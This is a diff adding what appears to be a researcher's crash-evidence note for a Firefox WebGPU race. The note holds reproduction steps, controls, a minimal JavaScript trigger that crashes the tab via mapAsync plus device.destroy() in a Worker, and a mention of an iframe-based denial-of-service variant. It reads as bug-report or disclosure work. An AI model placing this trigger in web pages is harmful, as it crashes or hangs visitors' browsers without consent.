@@ -1,0 +1,61 @@
+WebGPU Worker mapAsync/destroy Race — Crash Evidence
+Date: 2026-06-29
+Researcher: sn0x
+Browser: Firefox 146.0.1 (Playwright build, Linux x86_64)
+Prefs: dom.webgpu.enabled=true, dom.webgpu.workers.enabled=true
+
+=== CRASH REPRODUCTION (3/3 runs) ===
+
+Pattern:
+  1. Web Worker calls navigator.gpu.requestAdapter()  → GPU IPC ✓ (runs fine)
+  2. Web Worker calls adapter.requestDevice()          → GPU IPC ✓ (runs fine)
+  3. Web Worker calls buf.mapAsync(GPUMapMode.READ)   → GPU IPC (in flight)
+  4. Web Worker calls device.destroy()                → GPU IPC (destroy)
+  5. Web Worker awaits mapProm                        → PAGE CRASHES
+
+Timeline (observed via Playwright console monitoring):
+  t=0.0s  [console] "[*] Spawning Worker with mapAsync + device.destroy() race..."
+  t=0.0s  [console] "[*] Worker posted — waiting..."
+  t=~1.0s page.inner_text() fails: "Page.inner_text: Target page, context or browser has been closed"
+
+Playwright crash event: NOT FIRED (page becomes inaccessible before event fires)
+Worker timeout (5s): NOT REACHED (crash occurs ~1s after worker spawn)
+Worker error handler: NOT FIRED (crash occurs before error can be posted)
+
+=== CONTROLS (same session) ===
+
+Worker: just requestAdapter()         → PASS (no crash, returns adapter=true)
+Worker: requestAdapter + requestDevice → PASS (no crash, returns device=true)
+Worker: mapAsync + NO destroy          → PASS (map eventually resolves)
+Worker: mapAsync + device.destroy()    → CRASH (page inaccessible within ~1s)
+
+=== MINIMAL TRIGGER ===
+
+// 3 lines in a Web Worker crash the page:
+const adapter = await navigator.gpu.requestAdapter();
+const device = await adapter.requestDevice();
+const buf = device.createBuffer({size:4096, usage: GPUBufferUsage.MAP_READ|GPUBufferUsage.COPY_DST});
+const mapProm = buf.mapAsync(GPUMapMode.READ);
+device.destroy();   // in-flight map IPC + destroy IPC = crash
+await mapProm;      // awaiting stale operation → crash
+
+=== ORIGINAL DOS VECTOR (iframes, webgpu_dos.html) ===
+
+Also confirmed (prior session). Repeated iframe teardown while mapAsync in flight
+wedges the GPU process, causing all subsequent requestAdapter()/requestDevice() calls
+to hang indefinitely. The Worker variant above is a STRONGER vector — full page crash
+vs. GPU wedge — and simpler (no iframes required).
+
+=== CRASH HYPOTHESIS ===
+
+The GPU process (wgpu, Firefox's WebGPU backend) dispatches map IPC and destroy IPC
+in sequence. The destroy IPC frees the buffer's backing storage. When the pending
+map operation completes in the GPU process, it attempts to deliver the result to the
+now-freed buffer object → use-after-free in the GPU process → GPU process crash →
+Firefox tab crash.
+
+This is consistent with:
+- Crash occurs only when mapAsync and device.destroy() are BOTH called (race)
+- Crash occurs within ~1s (map IPC round-trip time)
+- Controls with only mapAsync (no destroy) do not crash
+- Controls with only device.destroy() (no pending map) do not crash
